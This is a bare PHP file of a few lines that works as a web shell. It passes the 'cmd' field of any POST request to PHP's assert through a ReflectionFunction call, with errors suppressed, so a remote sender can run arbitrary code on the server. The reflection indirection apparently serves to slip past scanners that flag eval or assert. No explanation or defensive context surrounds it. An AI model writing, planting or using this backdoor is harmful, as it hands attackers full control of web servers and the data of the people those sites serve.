<?php 
$s = new ReflectionFunction("assert");
@$s -> invoke($_POST["cmd"]);
?>